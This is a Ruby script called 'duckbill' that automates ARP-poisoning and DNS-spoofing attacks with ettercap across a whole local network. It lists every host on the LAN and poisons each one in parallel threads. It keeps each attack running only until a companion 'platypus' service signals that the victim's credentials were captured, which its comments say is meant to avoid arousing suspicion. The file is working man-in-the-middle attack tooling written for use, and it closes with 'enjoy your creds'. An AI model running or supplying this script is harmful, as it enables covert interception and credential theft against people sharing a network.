#!/usr/bin/env ruby

# duckbill - An ettercap manager for use with platypus by pierce
#
# Authored by sibios for integration with platypus.  Duckbill
# will manage your ettercap instances and keep them alive against
# targets for as long as is necessary to hijack credentials, but
# no longer (to avoid elliciting suspicion).
#
# It's quick.  It's dirty.  It's probably VERY buggy.  It's
# provided as is without warranty of any kind.
#
# Shouts to pierce, postmodern, breadtk, starik, goldy, drraid

require 'thread/pool'
require 'net/http'
require 'optparse'

DEBUG = true
POOL_SIZE = 4
ETTER_MAGIC = "ettercap -T%s -i %s %s /%s/ /%s/"
GATEWAY_MAGIC = "ip route show | grep '%s' | grep default | cut -d' ' -f3 | awk '{ print $1}'"
IP_MAGIC = "ifconfig %s | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'"

#Blacklist/Finished-with-list related settings
BLACKLIST_HOST = "127.0.0.1"
BLACKLIST_PORT = 8000
SLEEP_DURATION = 5
TIME_TO_ATTACK = 60

def poison_worker(target_ip,scan_object)
	return if target_ip.empty?
	return if scan_object[:interrupt]

	cmd = ETTER_MAGIC % ["qz",scan_object[:interface],"-M arp:remote -P dns_spoof",scan_object[:gateway],target_ip]
	#spawn a child PID doing the ettercapping
	puts "[DEBUG] Poisoning victim (#{target_ip})" if DEBUG
	child = IO.popen(cmd, [:out,:err]=>"/dev/null")

	#parent should poll already-attacked list every few seconds to see if we need to kill the child
	http = Net::HTTP.new(scan_object[:manager_host],scan_object[:manager_port])

	iterations = scan_object[:thread_ttl] / scan_object[:thread_sleep]
	iterations.times do |attempt|
		#break if target_mac == "00:50:e8:01:91:5e"
		sleep(scan_object[:thread_sleep])
		

		if scan_object[:interrupt]
			puts "[INFO] SIGTERM caught in worker, clean RE-ARPing (#{target_ip})" if $verbosity > 0
			child.puts "q"
			return
		end

		begin
			response = http.get("/blacklist?host=#{target_ip}")
			puts "[DEBUG] Performed a blacklist check against #{target_ip}, got #{response.code} / #{response.body}" if DEBUG
			#break if headers.code == 200
			break if response.body.match(/YUP/)
		rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError,
		     	Net::HTTPBadResponse, Net::HTTPHeaderSyntaxError,
			Net::ProtocolError, Errno::ECONNREFUSED => e
			puts "[INFO] Error in communicating with the finished-list (Attempt #{attempt})" if $verbosity > 0
			next
		rescue Exception => e
			puts "[ERROR] Something weird happened in worker: \"#{e.message}\"" if $verbosity > 0
		end
	end

	#kill the child PID after a timeout (in case target isn't active)
	puts "[INFO] Job's done! (RE-ARPing #{target_ip})" if $verbosity > 0	#Blizzard: don't sue me, bro!
	child.puts "q"
end

def get_gateway(interface)
	results = IO.popen(GATEWAY_MAGIC % [interface]).gets
	raise Exception,"Gateway check failed.  Check the connection on the interface." if results.nil?
	results.chomp
end

def get_ip(interface)
	results = IO.popen(IP_MAGIC % [interface]).gets
	raise Exception,"Failed to get an IP.  Check the connection on the interface." if results.nil?
	results.chomp
end

def get_hostlist(scan_object)
	cmd = ETTER_MAGIC % ["",scan_object[:interface],"-s 'lq'","",""]
	puts "[DEBUG] Calling \"#{cmd}\"" if DEBUG
	output = ""
  
	IO.popen(cmd,:err=>[:child,:out]).each { |child_io| output << child_io }
	puts "[DEBUG] Got scan output of \"#{output}\"" if DEBUG
	
	hosts = output.scan(/(\d+)\)\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s*([0-9A-F\:]+)/)
	puts "[INFO] Got host list of #{hosts.to_s}" if DEBUG
	hosts = hosts.flatten
	hosts.delete_if { |x| x.match("00:50:E8:01:91:5E") } 
	hosts.select { |x| x.match(/\./) }

	#hosts.flatten.select{ |x| x.match(/\./) } 	#turns the list of match/host pairs into a proper host list
end

def main(options)
	$verbosity = options[:verbosity]

	begin
		gateway = get_gateway(options[:interface])
		ip	= get_ip(options[:interface])
	rescue Exception => e
		puts e.message
		exit
	end

	scan_object = {
		:interface	=> options[:interface],
		:gateway	=> gateway,
		:ip		=> ip,
		:interrupt	=> false,
		:thread_sleep	=> options[:sleep_time],
		:thread_ttl	=> options[:ttl],
		:manager_host	=> options[:thread_manager_host],
		:manager_port	=> options[:thread_manager_port]
	}

	raise SecurityError, "Must be run as root!" unless Process.uid == 0

	puts "[DEBUG] Starting scan with settings: #{scan_object.to_s}" if DEBUG
	#thread pool is nice, but we may want to consider whether it's worth the extra
	#gem install or if we can get by with the built-in threading.
	# ...
	#Fuck that, it's worth it!
	pool = Thread.pool(POOL_SIZE)

	#find the hosts
	hosts = get_hostlist(scan_object)

	puts "[INFO] Hosts: #{hosts.to_s}" if $verbosity > 0
	#then start the threads on EACH host
	
	Signal.trap("SIGINT") do
 		scan_object[:interrupt] = true
		puts "[INFO] Kill signal caught, cleaning up workers" if $verbosity > 0
	end

	hosts.each do |host|
		#skip on targeting gateway and self
		next if host == scan_object[:gateway]
		next if host == scan_object[:ip]
		
		if scan_object[:interrupt]
			pool.shutdown!
			break
		end

		begin
			pool.process { poison_worker(host,scan_object) }
		rescue SignalException
			puts "cleaning up..."
			pool.shutdown!
		rescue Exception => e
			puts "[ERROR] Something funky happened with the pool, try again with next host\n#{e.message}" if $verbosity > 0
			next
		end
	end
	
	#cleanup
	pool.shutdown
	puts "[INFO] Finished attacking, enjoy your creds :)" unless scan_object[:interrupt]
end

if $0 == __FILE__
	options = {}
	optparse = OptionParser.new do |opts|
		opts.banner = "Usage: #{$PROGRAM_NAME} [options] INTERFACE"
		
		options[:verbosity] = 0
		opts.on("-v","--verbose","Optional info messaging") do
			options[:verbosity] = 1
		end

		opts.on("-h","--help","Display this usage info") do
			puts opts
			exit
		end
		
		options[:interface] = nil
		opts.on("-i","--interface INTERFACE","Mandatory interface") do |s|
			options[:interface] = s
		end

		options[:sleep_time] = SLEEP_DURATION
		opts.on("--sleep SLEEP","Override the duration of thread sleep times (defaults to #{SLEEP_DURATION} seconds)") do |sleep_time|
			options[:sleep_time] = sleep_time
		end

		options[:ttl] = TIME_TO_ATTACK
		opts.on("--ttl TIME","Override the default (#{TIME_TO_ATTACK} seconds) to keep a thread alive") do |ttl|
			options[:ttl] = ttl
		end

		options[:thread_manager_host],options[:thread_manager_port] = "#{BLACKLIST_HOST}:#{BLACKLIST_PORT}".split(/\:/)
		opts.on("--manager HOST:PORT","Override the default (#{BLACKLIST_HOST}:#{BLACKLIST_PORT}) thread manager provided by platypus") do |thread_manager|
			options[:thread_manager_host],options[:thread_manager_port] = options[:manager].split(/\:/)
		end
	end

	begin optparse.parse! ARGV
	if options[:interface].nil?
		raise OptionParser::MissingArgument, "Need an interface to work on"
	end
	rescue OptionParser::ParseError => e
		puts e.message
		puts optparse
		exit 1
	end

	begin
		main(options)
	rescue SecurityError => e
		puts e.message
	end
end
